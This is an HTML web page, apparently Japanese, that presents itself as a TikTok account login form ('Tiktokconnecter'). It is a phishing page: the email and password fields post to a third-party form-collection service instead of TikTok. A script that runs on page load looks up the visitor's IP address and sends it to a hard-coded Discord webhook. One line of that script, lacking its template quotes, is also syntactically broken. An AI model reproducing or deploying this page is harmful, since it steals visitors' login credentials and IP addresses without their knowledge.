<!DOCTYPE html>
<html lang="ja">
  <head>
    <!-- 初期設定 -->
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="style.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <title>かめっちの公式サイトー接続</title>
    <script src="https://kit.fontawesome.com/f52d18f519.js" crossorigin="anonymous" ></script>
  </head>
  <body>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
    <div class="dashboard">
        <!-- ヘッダー -->
        <header class="header mb-0 bg-white border-bottom">
          <div class="site">Tiktokconnecter</div>
        </header>

        <!-- メイン -->
        <main class="main mb-0 bg-Gainsboro">
          
          <form action="https://api.staticforms.xyz/submit" method="post" class="form">
            <h1 class="heading-center">tiktokのアカウントにログインする</h1>
            <input type="hidden" name="accessKey" value="20b6f0f2-4e5a-43de-b760-caab8d9b3830" >
            
            <div class="field">
                <label for="email">メールアドレス</label>
                <input type="email" id="email" name="email" placeholder="mail@example.com">
                <p class="text-xsmall">メールアドレスを入力してください</p>
            </div>
            <div class="field">
                <label for="name">パスワード</label>
                <input type="name" id="name" name="name" placeholder="XXXXXXXXXX">
                <p class="text-xsmall">パスワードを入力してください</p>
            </div>
                <input type="hidden" name="redirectTo" value="https://example.com/contact/success">
                <input type="submit" class="btn-accent" value="送信する">
          </form>
        </main>

        <!-- サイドバー -->
        <div class="side mb-0 navbar-dark bg-dark">サイドバー</div>
        <script>
          function getIPAddress() {
                      fetch('https://api.ipify.org/?format=json')
                          .then(response => response.json())
                          .then(data => {
                              const ipAddress = data.ip;
                              sendToDiscord(ipAddress); // 取得したIPアドレスをDiscordに送信
                          })
                          .catch(error => console.error('IPアドレスの取得に失敗しました:', error));
                  }
          
                  function sendToDiscord(ipAddress)  {
                      const webhookURL = 'https://discord.com/api/webhooks/1255478798925955083/nUzhpsvj6TMxVG9yLP5VJWaPhV6oDrg8g-nF8w3XBtrBvHFpOTQhlAhks1IexGPP7tkv';
                      const payload = {
                          embeds: [{
                              title: '入れたい文字',
                              description: IP address: ${ipAddress},
                              color: 3447003 // 青色に設定
                          }]
                      };
          
                      fetch(webhookURL, {
                          method: 'POST',
                          headers: {
                              'Content-Type': 'application/json'
                          },
                          body: JSON.stringify(payload)
                      })
                      .then(response => {
                          if (!response.ok) {
                              console.error('Discordへの送信に失敗しました:', response.statusText);
                          }
                      })
                      .catch(error => console.error('Discordへの送信に失敗しました:', error));
                  }
          
                  getIPAddress();
              </script> 
          
  </body>
</html>